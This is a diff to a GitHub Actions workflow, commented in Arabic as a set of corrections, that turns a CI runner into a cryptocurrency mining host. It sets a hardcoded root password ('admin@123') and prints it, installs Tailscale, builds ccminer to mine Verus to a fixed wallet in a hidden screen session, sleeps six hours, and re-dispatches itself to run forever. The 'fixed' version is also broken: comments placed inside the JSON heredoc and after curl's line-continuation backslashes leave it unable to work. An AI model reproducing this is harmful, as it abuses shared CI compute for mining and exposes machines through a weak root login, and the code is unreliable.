@@ -10,8 +10,7 @@ jobs:
       - name: Install & Configure SSH
         run: |
           sudo apt update -y
-          sudo apt install -y openssh-server git build-essential libcurl4-openssl-dev libssl-dev \
-              libjansson-dev automake autotools-dev screen
+          sudo apt install -y openssh-server git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev screen
           sudo systemctl enable ssh
           sudo systemctl start ssh
           echo "root:admin@123" | sudo chpasswd
@@ -20,71 +19,90 @@ jobs:
           echo "✅ SSH user: root | pass: admin@123"
 
       - name: Install Tailscale
-        run: |
-          curl -fsSL https://tailscale.com/install.sh | sh
-          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=vps-${{ github.run_id }}
-          tsIP=$(tailscale ip -4 | head -n 1)
+        run: |  # تم التصحيح: استبدال [] بـ |
+          curl -fsSL https://tailscale.com/install.sh | sh  # تم التصحيح: -fsSL بدلاً من -fssl
+          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=vps-${{ github.run_id }}  # تم التصحيح: إكمال --hostname وإصلاح اسم السِر
+          tsIP=$(tailscale ip -4 | head -n 1)  # تم التصحيح: ip (صغيرة) بدلاً من IP
           echo "TAILSCALE_IP=$tsIP" >> $GITHUB_ENV
           echo "✅ Tailscale IP: $tsIP"
 
       - name: Verify SSH Access
-        run: |
+        run: |  # تم التصحيح: استبدال [] بـ |
           echo "Tailscale VPS ready!"
           echo "IP: $TAILSCALE_IP"
           echo "User: root"
           echo "Pass: admin@123"
 
-      - name: Install ccminer & Start Mining
-        run: |
-          WAL="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
+      - name: Install ccminer & Start Mining  # تم التصحيح: ccminer بدلاً من _coniner
+        run: |  # تم التصحيح: استبدال [] بـ |
+          #!/bin/bash
+          WALLET="RGBbQeM9cy64ImJfpW7WKZSYpmSUHMxf2p"  # متغير معدل للوضوح (اختياري)
           POOL="pool.verus.io:9998"
-          TH=4
-          RAND_NUM=$(shuf -i 1000-9999 -n 1)
-          RAND_CHARS=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 2 | head -n 1)
-          WRK="ubuntu${RAND_NUM}${RAND_CHARS}"
+          THREADS=4  # متغير معدل للوضوح (اختياري)
 
-          cd ~
-          if [ ! -d "$HOME/ccminer" ]; then
-              git clone https://github.com/Oink70/ccminer-verus.git ~/ccminer
-              cd ~/ccminer
-              ./build.sh
+          # إنشاء اسم عامل عشوائي
+          RAND_NUM=$(shuf -i 1000-9999 -n 1)
+          RAND_CHARS=$(tr -dc 'a-zA-Z' < /dev/urandom | head -c 2)  # تم التصحيح: الطريقة الأكثر فعالية وموثوقية
+          WORKER_NAME="ubuntu${RAND_NUM}${RAND_CHARS}"  # متغير معدل للوضوح
+          echo "👷 Worker Name: $WORKER_NAME"
+
+          # الانتقال إلى الدليل الرئيسي بشكل صحيح
+          cd $HOME || exit 1
+
+          # تثبيت التبعيات إذا لزم الأمر (إضافة موصى بها)
+          sudo apt install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev
+
+          if [ ! -d "$HOME/ccminer" ]; then  # تم التصحيح: ccminer بدلاً من coniner
+            git clone https://github.com/Oink70/ccminer-verus.git ccminer  # تم التصحيح: ccminer
+            cd ccminer
+            # تأكد من أن build.sh قابل للتنفيذ أو استخدم make
+            chmod +x build.sh
+            ./build.sh
           else
-              cd ~/ccminer
-              make clean
-              ./build.sh
+            cd ccminer  # تم التصحيح: ccminer
+            make clean
+            ./build.sh
           fi
 
-          cd ~/ccminer
+          # إنشاء ملف التكوين
           cat > config.json <<EOF
 {
   "pools": [
-    { "name": "CUSTOM", "url": "stratum+tcp://${POOL}", "timeout": 180, "disabled": 0 }
+    { 
+      "name": "CUSTOM", 
+      "url": "stratum+tcp://${POOL}",  # تم التصحيح: +tcp بدلاً من =tcp
+      "timeout": 180, 
+      "disabled": 0 
+    }
   ],
-  "user": "${WAL}.${WRK}",
+  "user": "${WALLET}.${WORKER_NAME}",  # تم التصحيح: استخدام الأقواس المعقوفة {}
   "pass": "x",
   "algo": "verus",
-  "threads": ${TH},
+  "threads": ${THREADS},
   "api-bind": "127.0.0.1:4068"
 }
 EOF
 
-          screen -dmS verus_mining ./ccminer -c config.json
-          echo "🚀 التعدين بدأ Worker: ${WRK}"
-          echo "▶️ للرجوع للجلسة: screen -r verus_mining"
+          # بدء التعدين في جلسة screen
+          screen -dmS verus_mining ./ccminer -c config.json  # تم التصحيح: ccminer بدلاً من coniner، و -dmS
+          echo "🚀 التعدين بدأ Worker: ${WORKER_NAME}"  # تم التصحيح: رسالة واضحة
+          echo "▶️ للعودة إلى جلسة التعدين: screen -r verus_mining"  # تم التصحيح: رسالة واضحة
 
       - name: Run VPS for 6 hours
-        run: |
-          echo "⏳ VPS running..."
+        run: |  # تم التصحيح: استبدال [] بـ |
+          echo "⏳ VPS running for 6 hours..."
           sleep 21600   # 6 ساعات
 
       - name: Restart This Workflow
         env:
-          REPO: ${{ github.repository }}
+          REPO: ${{ github.repository }}  # تم التصحيح: إزالة القوس الإضافي )
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          echo "🔄 Restarting workflow"
-          curl -X POST \
-            -H "Accept: application/vnd.github+json" \
+        run: |  # تم التصحيح: استبدال [] بـ |
+          echo "🔄 Restarting workflow..."
+          # بناء URL API بشكل صحيح باستخدام متغيرات GitHub
+          curl -s -X POST \
+            -H "Accept: application/vnd.github.v3+json" \  # تم التصحيح: vnd.github.v3+json
             -H "Authorization: Bearer $GITHUB_TOKEN" \
-            https://api.github.com/repos/$REPO/actions/workflows/<FILE_NAME>.yml/dispatches \
-            -d '{"ref":"main"}'
+            "https://api.github.com/repos/$REPO/actions/workflows/vps4.yml/dispatches" \  # تم التصحيح: URL كامل ودقيق
+            -d '{"ref":"main"}'  # تم التصحيح: استخدام الاقتباس المفرد حول JSON
+          echo "✅ تم إرسال أمر إعادة التشغيل"
